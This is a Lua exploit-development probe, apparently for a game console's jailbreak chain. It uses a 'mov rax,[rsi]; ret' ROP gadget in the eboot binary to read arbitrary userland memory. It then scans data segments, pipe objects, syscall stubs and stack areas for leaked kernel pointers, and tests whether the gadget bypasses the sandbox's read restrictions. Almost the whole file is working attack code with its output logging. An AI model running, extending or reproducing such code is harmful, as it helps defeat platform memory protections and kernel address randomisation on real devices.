-- CRASH_CLASS: LOW
-- PROBE 118c: Test mov rax,[rsi];ret gadget for arbitrary userland read
--
-- 118b found: mov rax,[rsi];ret at eboot+0x1A5CC4, 0x1C5554
--             mov eax,[rsi];ret at eboot+0x169B0C
--
-- native.fcall_with_rax(addr, rax, rdi, rsi) → sets RAX/RDI/RSI, calls addr
-- For mov rax,[rsi];ret: fcall_with_rax(gadget, 0, 0, target) → reads [target]
--
-- This probe:
-- A: Validate gadget with known addresses
-- B: Read eboot ELF header via gadget
-- C: Read eboot .data segment (past .text) for globals/pointers
-- D: Read dynlib_get_info output struct for any missed pointers
-- E: Scan loader internal structures (Lua state, etc.)
-- F: Check if gadget bypasses memory.read_qword restrictions

print("=== PROBE 118c: RSI READ GADGET TEST ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val)=="table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function is_kptr(val)
    if val==nil then return false end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    return h>=0xFFFF8000 and h~=0xFFFFFFFF
end
local function fmt_ptr(val)
    if val==nil then return "nil" end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    if l<0 then l=l+0x100000000 end
    return string.format("0x%X%08X",h,l)
end

local stub=syscall.pipe.fn_addr
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local inf=memory.alloc(0x200)
wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local EB = N(uint64(string.format("0x%X%08X",ehi,elo)))
print(string.format("eboot=0x%X%08X", ehi, elo))

-- Get text size too
local tsz_lo=rd(inf+0x110) or 0; local tsz_hi=rd(inf+0x114) or 0
if tsz_lo<0 then tsz_lo=tsz_lo+0x100000000 end
print(string.format("text_size=0x%X%08X", tsz_hi, tsz_lo))

-- Gadget addresses (from 118b scan)
local G_RSI_Q = EB + 0x1A5CC4   -- mov rax,[rsi]; ret (qword read via RSI)
local G_RSI_Q2 = EB + 0x1C5554  -- backup
local G_RSI_D = EB + 0x169B0C   -- mov eax,[rsi]; ret (dword read)
local G_RDI18 = EB + 0x5D940    -- mov rax,[rdi+0x18]; ret

-- Helper: native read via gadget
local function native_rq(addr)
    local ok, val = pcall(function()
        return native.fcall_with_rax(G_RSI_Q, 0, 0, addr)
    end)
    if ok and val then return val end
    return nil
end

local function native_rd(addr)
    local ok, val = pcall(function()
        return native.fcall_with_rax(G_RSI_D, 0, 0, addr)
    end)
    if ok then return N(val) end
    return nil
end

-- ============================================================
print("")
print("--- A: VALIDATE GADGET ---")

-- Test 1: read known buffer
local tbuf = memory.alloc(16)
wq(tbuf, uint64(0xDEADBEEF12345678))
local v1 = native_rq(N(tbuf))
print(string.format("  read(test_buf): %s (expect DEADBEEF12345678)", fmt_ptr(v1)))

-- Test 2: read eboot base (ELF magic)
local v2 = native_rd(EB)
local uv2 = v2
if v2 and v2<0 then uv2=v2+0x100000000 end
print(string.format("  read_dword(eboot+0): 0x%X (expect 0x464C457F)", uv2 or 0))

if uv2 == 0x464C457F then
    print("  *** ELF MAGIC CONFIRMED — GADGET WORKS! ***")
end

-- Test 3: read eboot ELF header fields
local v3 = native_rq(EB + 0x18)  -- e_entry
print(string.format("  e_entry: %s", fmt_ptr(v3)))
local v4 = native_rq(EB + 0x20)  -- e_phoff
print(string.format("  e_phoff: %s", fmt_ptr(v4)))

-- Verify: same as memory.read_qword?
local m3 = rq(EB + 0x18)
local m4 = rq(EB + 0x20)
print(string.format("  memory.rq(e_entry): %s (should match)", fmt_ptr(m3)))
print(string.format("  memory.rq(e_phoff): %s (should match)", fmt_ptr(m4)))

local c = N(native.fcall_with_rax(stub,20))
if c~=pid then print("DIED!") return end

-- ============================================================
print("")
print("--- B: SCAN EBOOT DATA SEGMENT ---")
-- The data segment typically follows .text + .rodata
-- Try reading past text_size
local data_start = EB + tsz_lo  -- approximate
print(string.format("  approx data start: 0x%X", data_start))

-- Scan data segment for kernel pointers
local kptr_found = 0
local scan_data = 0x40000  -- 256KB of data segment
for off=0,scan_data-8,8 do
    local addr = data_start + off
    local val = native_rq(addr)
    if val==nil then
        print(string.format("  unreadable at data+0x%X", off))
        break
    end
    if is_kptr(val) then
        kptr_found = kptr_found + 1
        print(string.format("  *** KPTR data+0x%X: %s ***", off, fmt_ptr(val)))
        if kptr_found >= 20 then break end
    end
end
print(string.format("  data segment: scanned 0x%X bytes, %d kernel ptrs", scan_data, kptr_found))

c = N(native.fcall_with_rax(stub,20))
if c~=pid then print("DIED after data scan!") return end

-- ============================================================
print("")
print("--- C: SCAN PIPE OBJECT INTERNAL STRUCTURE ---")
-- tostring(syscall.pipe) gives us addresses of the pipe object
-- Let's extract them and scan around those addresses
local pipe_str = tostring(syscall.pipe)
print("  pipe_str: " .. (pipe_str or "nil"))

-- Extract addresses from pipe string
local addrs = {}
for hex in pipe_str:gmatch("0x[0-9a-fA-F]+") do
    local val = tonumber(hex)
    if val and val > 0x1000 then
        table.insert(addrs, val)
    end
end
print(string.format("  extracted %d addresses from pipe", #addrs))

-- Scan around each address for kernel pointers
for i, base in ipairs(addrs) do
    if i > 5 then break end  -- limit
    local kp = 0
    for off=-0x100,0x200,8 do
        local val = native_rq(base + off)
        if val and is_kptr(val) then
            kp = kp + 1
            print(string.format("  *** KPTR pipe[%d]+0x%X: %s ***", i, off, fmt_ptr(val)))
        end
    end
    if kp == 0 then
        print(string.format("  pipe addr[%d] (0x%X): 0 kptrs in +-range", i, base))
    end
end

c = N(native.fcall_with_rax(stub,20))
if c~=pid then print("DIED after pipe scan!") return end

-- ============================================================
print("")
print("--- D: SCAN AROUND SYSCALL ADDRESSES ---")
-- syscall.syscall_address (SA) and stub (fn_addr) are in interesting areas
local SA = N(syscall.syscall_address)
local FN = N(stub)
print(string.format("  SA=0x%X FN=0x%X", SA, FN))

-- SA is the syscall entry point in libkernel — scan around it
for off=-0x400,0x400,8 do
    local val = native_rq(SA + off)
    if val and is_kptr(val) then
        print(string.format("  *** KPTR SA+0x%X: %s ***", off, fmt_ptr(val)))
    end
end

-- Scan FN (pipe.fn_addr) vicinity
for off=-0x200,0x200,8 do
    local val = native_rq(FN + off)
    if val and is_kptr(val) then
        print(string.format("  *** KPTR FN+0x%X: %s ***", off, fmt_ptr(val)))
    end
end

c = N(native.fcall_with_rax(stub,20))
if c~=pid then print("DIED after SA scan!") return end

-- ============================================================
print("")
print("--- E: CHECK GADGET VS memory.read_qword COVERAGE ---")
-- Test addresses that memory.read_qword might reject
-- The TCB/FS_BASE area and Lua state internals
-- Try reading addresses near the stack

-- Get approximate stack via alloc
local stack_marker = memory.alloc(8)
local SM = N(stack_marker)
print(string.format("  stack_area ~ 0x%X", SM))

-- Scan above and below stack area for kernel pointers
local stack_kp = 0
for off=-0x4000,0x4000,8 do
    local addr = SM + off
    -- Try native gadget
    local gval = native_rq(addr)
    -- Try memory.read_qword
    local mval = rq(addr)
    -- Check if gadget reads where memory.read doesn't
    if gval and not mval then
        print(string.format("  GADGET-ONLY at 0x%X: %s", addr, fmt_ptr(gval)))
        if is_kptr(gval) then
            stack_kp = stack_kp + 1
            print(string.format("  *** KPTR (gadget-only) 0x%X: %s ***", addr, fmt_ptr(gval)))
        end
    end
    if gval and is_kptr(gval) then
        stack_kp = stack_kp + 1
        print(string.format("  *** KPTR stack+0x%X: %s ***", off, fmt_ptr(gval)))
        if stack_kp >= 10 then break end
    end
end

-- ============================================================
print("")
print("--- F: SCAN ALL MODULE DATA SEGMENTS ---")
-- Use dynlib_get_info for all handles to find data segments
local sc_info = mk(593)
local data_kptrs = 0
for handle=0,5 do
    wd(inf,0x160)
    pcall(function() sc_info(uint64(handle), inf) end)
    local tlo=rd(inf+0x108) or 0; local thi=rd(inf+0x10C) or 0
    if thi<0 then thi=thi+0x100000000 end
    if tlo<0 then tlo=tlo+0x100000000 end
    local tsz=rd(inf+0x110) or 0
    if tsz<0 then tsz=tsz+0x100000000 end
    local dlo=rd(inf+0x118) or 0; local dhi=rd(inf+0x11C) or 0
    if dhi<0 then dhi=dhi+0x100000000 end
    if dlo<0 then dlo=dlo+0x100000000 end
    local dsz=rd(inf+0x120) or 0
    if dsz<0 then dsz=dsz+0x100000000 end

    if dhi > 0 or dlo > 0 then
        local DB = N(uint64(string.format("0x%X%08X", dhi, dlo)))
        print(string.format("  module %d: data=0x%X%08X size=0x%X", handle, dhi, dlo, dsz))
        -- Scan first 16KB of data segment
        local limit = math.min(dsz, 0x4000)
        for off=0,limit-8,8 do
            local val = native_rq(DB + off)
            if val and is_kptr(val) then
                data_kptrs = data_kptrs + 1
                print(string.format("    *** KPTR mod%d data+0x%X: %s ***", handle, off, fmt_ptr(val)))
                if data_kptrs >= 15 then break end
            end
        end
    end
    if data_kptrs >= 15 then break end
end
print(string.format("  module data segments: %d kernel ptrs total", data_kptrs))

-- ============================================================
print("")
local fc=N(native.fcall_with_rax(stub,20))
print(string.format("FINAL: canary=%s", fc==pid and "OK" or "FAIL"))
print("=== 118c COMPLETE ===")
